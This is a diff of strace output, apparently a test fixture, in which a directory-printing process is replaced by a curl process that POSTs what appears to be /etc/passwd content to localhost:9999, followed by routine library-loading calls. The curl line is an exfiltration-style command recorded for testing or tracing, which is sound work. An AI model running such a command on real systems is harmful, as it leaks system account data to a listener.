-[pid 1044650] mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f203be4c000
-[pid 1044650] arch_prctl(ARCH_SET_FS, 0x7f203be4c740) = 0
-[pid 1044650] set_tid_address(0x7f203be4ca10) = 1044650
-[pid 1044650] set_robust_list(0x7f203be4ca20, 24) = 0
-[pid 1044650] rseq(0x7f203be4d0e0, 0x20, 0, 0x53053053) = 0
-[pid 1044650] mprotect(0x7f203c064000, 16384, PROT_READ) = 0
-[pid 1044650] mprotect(0x5644b2fd9000, 4096, PROT_READ) = 0
-[pid 1044650] mprotect(0x7f203c0c1000, 8192, PROT_READ) = 0
-[pid 1044650] prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
-[pid 1044650] munmap(0x7f203c077000, 62747) = 0
-[pid 1044650] getrandom("\x8b\x22\xc1\xca\xc6\x8f\x32\x32", 8, GRND_NONBLOCK) = 8
-[pid 1044650] brk(NULL)                 = 0x5644b338e000
-[pid 1044650] brk(0x5644b33af000)       = 0x5644b33af000
-[pid 1044650] openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
-[pid 1044650] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=6784496, ...}, AT_EMPTY_PATH) = 0
-[pid 1044650] mmap(NULL, 6784496, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f203b7d3000
-[pid 1044650] close(3)                  = 0
-[pid 1044650] newfstatat(1, "", {st_mode=S_IFREG|0664, st_size=12785, ...}, AT_EMPTY_PATH) = 0
-[pid 1044650] write(1, "current directory /home/ueno/tmp"..., 41current directory /home/ueno/tmp/cmdsbst
-) = 41
-[pid 1044650] close(1)                  = 0
-[pid 1044650] close(2)                  = 0
-[pid 1044650] exit_group(0)             = ?
-[pid 1044650] +++ exited with 0 +++
-<... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1044650
---- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1044650, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
-rt_sigreturn({mask=[]})                 = 1044650
-wait4(-1, 0x7fff3deb244c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+[pid 204979] rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
+[pid 204979] execve("/usr/bin/curl", ["curl", "-X", "POST", "-droot:x:0:0:root:/root:/bin/bas"..., "localhost:9999"], 0x55f7ccd71038 /* 63 vars */ <unfinished ...>
+[pid 204977] <... vfork resumed>)       = 204979
+[pid 204977] rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid 204979] <... execve resumed>)      = 0
+[pid 204977] <... rt_sigprocmask resumed>~[KILL STOP RTMIN RT_1], 8) = 0
+[pid 204977] wait4(-1,  <unfinished ...>
+[pid 204979] brk(NULL)                  = 0x56066496c000
+[pid 204979] arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd63ada280) = -1 EINVAL (Invalid argument)
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f13295a9000
+[pid 204979] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid 204979] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=76099, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 76099, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f1329596000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcurl.so.4", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=673560, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 676712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13294f0000
+[pid 204979] mprotect(0x7f13294ff000, 589824, PROT_NONE) = 0
+[pid 204979] mmap(0x7f13294ff000, 475136, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xf000) = 0x7f13294ff000
+[pid 204979] mmap(0x7f1329573000, 110592, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x83000) = 0x7f1329573000
+[pid 204979] mmap(0x7f132958f000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9e000) = 0x7f132958f000
+[pid 204979] mmap(0x7f1329595000, 872, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f1329595000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libz.so.1", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=108936, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 110776, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13294d4000
+[pid 204979] mprotect(0x7f13294d6000, 98304, PROT_NONE) = 0
+[pid 204979] mmap(0x7f13294d6000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f13294d6000
+[pid 204979] mmap(0x7f13294e7000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13000) = 0x7f13294e7000
+[pid 204979] mmap(0x7f13294ee000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19000) = 0x7f13294ee000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
+[pid 204979] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+[pid 204979] pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
+[pid 204979] pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0i8\235HZ\227\223\333\350s\360\352,\223\340."..., 68, 896) = 68
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2216304, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+[pid 204979] mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13292ac000
+[pid 204979] mmap(0x7f13292d4000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f13292d4000
+[pid 204979] mmap(0x7f1329469000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7f1329469000
+[pid 204979] mmap(0x7f13294c1000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7f13294c1000
+[pid 204979] mmap(0x7f13294c7000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f13294c7000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libnghttp2.so.14", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=166256, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 168176, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1329282000
+[pid 204979] mmap(0x7f1329287000, 86016, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f1329287000
+[pid 204979] mmap(0x7f132929c000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a000) = 0x7f132929c000
+[pid 204979] mmap(0x7f13292a8000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7f13292a8000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=129096, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 131088, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1329261000
+[pid 204979] mmap(0x7f1329263000, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f1329263000
+[pid 204979] mmap(0x7f1329267000, 102400, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f1329267000
+[pid 204979] mmap(0x7f1329280000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e000) = 0x7f1329280000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/librtmp.so.1", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=121864, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 123824, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1329242000
+[pid 204979] mprotect(0x7f1329247000, 98304, PROT_NONE) = 0
+[pid 204979] mmap(0x7f1329247000, 65536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f1329247000
+[pid 204979] mmap(0x7f1329257000, 28672, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15000) = 0x7f1329257000
+[pid 204979] mmap(0x7f132925f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c000) = 0x7f132925f000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libssh.so.4", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=441944, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1329240000
+[pid 204979] mmap(NULL, 443872, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13291d3000
+[pid 204979] mprotect(0x7f13291e0000, 376832, PROT_NONE) = 0
+[pid 204979] mmap(0x7f13291e0000, 274432, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xd000) = 0x7f13291e0000
+[pid 204979] mmap(0x7f1329223000, 98304, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x50000) = 0x7f1329223000
+[pid 204979] mmap(0x7f132923c000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x68000) = 0x7f132923c000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpsl.so.5", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=75768, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 77840, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13291bf000
+[pid 204979] mmap(0x7f13291c1000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f13291c1000
+[pid 204979] mmap(0x7f13291c3000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x7f13291c3000
+[pid 204979] mmap(0x7f13291d1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x11000) = 0x7f13291d1000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libssl.so.3", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=667864, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 669680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f132911b000
+[pid 204979] mmap(0x7f1329139000, 372736, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e000) = 0x7f1329139000
+[pid 204979] mmap(0x7f1329194000, 118784, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x79000) = 0x7f1329194000
+[pid 204979] mmap(0x7f13291b1000, 57344, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x95000) = 0x7f13291b1000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=4447536, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 4461760, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328cd9000
+[pid 204979] mmap(0x7f1328d8b000, 2478080, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb2000) = 0x7f1328d8b000
+[pid 204979] mmap(0x7f1328fe8000, 860160, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x30f000) = 0x7f1328fe8000
+[pid 204979] mmap(0x7f13290ba000, 385024, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3e0000) = 0x7f13290ba000
+[pid 204979] mmap(0x7f1329118000, 9408, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f1329118000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgssapi_krb5.so.2", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=338712, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 340960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328c85000
+[pid 204979] mprotect(0x7f1328c90000, 282624, PROT_NONE) = 0
+[pid 204979] mmap(0x7f1328c90000, 229376, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x7f1328c90000
+[pid 204979] mmap(0x7f1328cc8000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x43000) = 0x7f1328cc8000
+[pid 204979] mmap(0x7f1328cd5000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4f000) = 0x7f1328cd5000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libldap-2.5.so.0", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=376512, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 387936, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328c26000
+[pid 204979] mprotect(0x7f1328c34000, 311296, PROT_NONE) = 0
+[pid 204979] mmap(0x7f1328c34000, 237568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xe000) = 0x7f1328c34000
+[pid 204979] mmap(0x7f1328c6e000, 69632, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x48000) = 0x7f1328c6e000
+[pid 204979] mmap(0x7f1328c80000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x59000) = 0x7f1328c80000
+[pid 204979] mmap(0x7f1328c83000, 7008, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f1328c83000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/liblber-2.5.so.0", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=63992, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1328c24000
+[pid 204979] mmap(NULL, 65960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328c13000
+[pid 204979] mprotect(0x7f1328c16000, 49152, PROT_NONE) = 0
+[pid 204979] mmap(0x7f1328c16000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f1328c16000
+[pid 204979] mmap(0x7f1328c1e000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x7f1328c1e000
+[pid 204979] mmap(0x7f1328c22000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xe000) = 0x7f1328c22000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=841808, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 843832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328b44000
+[pid 204979] mmap(0x7f1328b4e000, 729088, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa000) = 0x7f1328b4e000
+[pid 204979] mmap(0x7f1328c00000, 69632, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xbc000) = 0x7f1328c00000
+[pid 204979] mmap(0x7f1328c11000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xcc000) = 0x7f1328c11000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libbrotlidec.so.1", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=51512, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 53352, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328b36000
+[pid 204979] mmap(0x7f1328b37000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1000) = 0x7f1328b37000
+[pid 204979] mmap(0x7f1328b3f000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0x7f1328b3f000
+[pid 204979] mmap(0x7f1328b42000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x7f1328b42000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libunistring.so.2", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=1743016, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 1743080, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f132898c000
+[pid 204979] mmap(0x7f132899d000, 221184, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x11000) = 0x7f132899d000
+[pid 204979] mmap(0x7f13289d3000, 1433600, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x47000) = 0x7f13289d3000
+[pid 204979] mmap(0x7f1328b31000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0x7f1328b31000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgnutls.so.30", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2000320, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 2009088, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13287a1000
+[pid 204979] mmap(0x7f13287d2000, 1216512, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x31000) = 0x7f13287d2000
+[pid 204979] mmap(0x7f13288fb000, 512000, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15a000) = 0x7f13288fb000
+[pid 204979] mmap(0x7f1328978000, 73728, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7f1328978000
+[pid 204979] mmap(0x7f132898a000, 6144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f132898a000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libhogweed.so.6", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=289800, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f132879f000
+[pid 204979] mmap(NULL, 291640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328757000
+[pid 204979] mprotect(0x7f132875f000, 253952, PROT_NONE) = 0
+[pid 204979] mmap(0x7f132875f000, 77824, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x8000) = 0x7f132875f000
+[pid 204979] mmap(0x7f1328772000, 172032, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b000) = 0x7f1328772000
+[pid 204979] mmap(0x7f132879d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x45000) = 0x7f132879d000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libnettle.so.8", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=281000, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 282840, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328711000
+[pid 204979] mmap(0x7f132871b000, 143360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa000) = 0x7f132871b000
+[pid 204979] mmap(0x7f132873e000, 90112, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2d000) = 0x7f132873e000
+[pid 204979] mmap(0x7f1328754000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x42000) = 0x7f1328754000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgmp.so.10", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=526896, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 528912, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f132868f000
+[pid 204979] mmap(0x7f1328699000, 389120, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa000) = 0x7f1328699000
+[pid 204979] mmap(0x7f13286f8000, 94208, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x69000) = 0x7f13286f8000
+[pid 204979] mmap(0x7f132870f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7f000) = 0x7f132870f000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libkrb5.so.3", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=828000, ...}, AT_EMPTY_PATH) = 0
